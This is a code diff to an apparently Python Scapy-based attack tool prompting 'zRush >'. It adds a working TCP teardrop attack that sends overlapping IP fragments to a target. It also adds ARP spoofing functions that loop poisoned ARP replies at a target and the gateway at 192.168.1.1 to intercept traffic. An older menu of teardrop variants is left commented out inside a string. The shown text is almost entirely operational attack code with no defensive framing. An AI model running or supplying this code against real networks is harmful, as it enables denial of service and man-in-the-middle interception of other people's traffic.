@@ -204,7 +204,12 @@ def UDPteardrop(src, dst, dport):
             send(ip/load1)
 
 def TCPteardrop(src, dst, dport):
-    print("[*] Select attack options from below:")
+    frags = fragment(IP(dst = dst)/TCP(sport = random.randint(1024, 65535),dport = dport)/("FAKE"*(1464//4)))
+
+    frags[1][Raw].load = struct.pack("!HH", 80, 80)
+    frags[1][IP].frag = 0
+    send(frags)
+"""    print("[*] Select attack options from below:")
     print("    1. small payload (36 bytes), 2 packets, offset = 3x8 bytes")
     print("    2. large payload (1300 bytes), 2 packets, offset = 80x8 bytes")
     print("    3. large payload (1300 bytes), 12 packets, offset = 80x8 bytes")
@@ -225,93 +230,58 @@ def TCPteardrop(src, dst, dport):
             offset = 18
             load2 = "x00"*size
 
-            ip2 = IP(src = src, dst = dst, flags = 0, proto = 6, frag = offset)
-            
-            send(ip1/load1)
-            send(ip2/load2)
-        case "2":
-            size = 1300
-            offset = 80
-            load1 = "A"*size
-            ip1 = IP(src = src, dst = dst, flags = "MF", proto = 6)
-
-            ip2 = IP(src = src, dst = dst, flags = 0, proto = 6, frag = offset)
-
-            send(ip1/load1)
-            send(ip2/load1)
-
-        case "3":
-            size = 1300
-            offset = 80
-            load1 = "A"*size
-            ip = IP(src = src, dst = dst, flags = "MF", proto = 6, frag = 0)
-
             send(ip/load1)
-            for i in range(1, 10):
-                ip.frag = offset
-                offset = offset + 80
-                send(ip/load1)
-            ip.frag = offset
-            ip.flags = 0
-            send(ip/load1)
-        case "4":
-            size = 1300
-            offset = 3
-            load1 = "\x00"*size
-            ip1 = IP(src = src, dst = dst, flags = "MF", proto = 6)
-
-            size = 4
-            offset = 18
-            load2 = "x00"*size
-
-            ip2 = IP(src = src, dst = dst, flags = 0, proto = 6, frag = offset)
-            
-            send(ip1/load1)
-            send(ip2/load2)
-        case "5":
-            size = 1300
-            offset = 10
-            load = "A"*size
-
-            ip = IP(src = src, dst = dst, flags = "MF", proto = 6)
-
-            ip2 = IP(src = src, dst = dst, flags = 0, proto = 6, frag = offset)
-
-            send(ip/load)
-            send(ip2/load)
-        case "6":
-            size = 1300
-            offset = 80
-            load1 = "A"*size
-            ip = IP(src = src, dst = dst, flags = "MF", proto = 6, frag = 0)
-
-            send(ip/load1)
-            try:
-                while(True):
-                    ip.frag = offset
-                    offset = offset + 80
-                    send(ip/load1)
-            except KeyboardInterrupt:
-                ip.frag = offset
-                ip.flags = 0
                 send(ip/load1)
         case "7":
             print("[*] enter size of pacekt")
-            size = input("zRush > ")
+            size = int(input("zRush > "))
             print("[*] enter number of pacekts")
             num = input("zRush > ")
             print("[*] enter offset of pacekt")
-            offset = input("zRush > ")
+            offset = int(input("zRush > "))
 
-            load1 = "A"*size
+            load1 = "A"*int(size)
             ip = IP(src = src, dst = dst, flags = "MF", proto = 6, frag = 0)
             send(ip/load1)
 
-            for i in range(1, num-1):
+            for i in range(1, int(num)-1):
                 ip.frag = offset
                 offset = offset + 80
                 send(ip/load1)
 
             ip.frag = offset
             ip.flags = 0
-            send(ip/load1)
+            send(ip/load1)"""
+            
+
+def get_mac_addr(ip):
+    arp_req = ARP(pdst = ip)
+    broadcast = Ether(dst = "ff:ff:ff:ff:ff:ff")
+    arp_req_brd = broadcast/arp_req
+    answered_list = srp(arp_req_brd, timeout = 5, verbose = False)[0]
+    return answered_list[0][1].hwsrc
+
+def spoof(target_ip, spoof_ip):
+    packet = ARP(op = 2, pdst = target_ip, hwdst = get_mac_addr(target_ip), psrc = spoof_ip)
+    send(packet, verbose = False)
+
+def restore(dst, src):
+    dst_mac = get_mac_addr(dst)
+    src_mac = get_mac_addr(src)
+    packet = ARP(op = 2, pdst = dst, hwdst = dst_mac, psrc = src, hwsrc = src_mac)
+    send(packet, verbose = False)
+
+def ARPSpoof(src, dst, dport):
+    gateway_ip = "192.168.1.1"
+    try:
+        sent_packets_count = 0
+        while (True):
+            spoof(dst, gateway_ip)
+            spoof(gateway_ip, dst)
+            sent_packets_count = sent_packets_count + 2
+            print("\r[*] Packets Sent " + str(sent_packets_count), end = "")
+            time.sleep(2)
+    except KeyboardInterrupt:
+        restore(gateway_ip, dst)
+        restore(dst, gateway_ip)
+
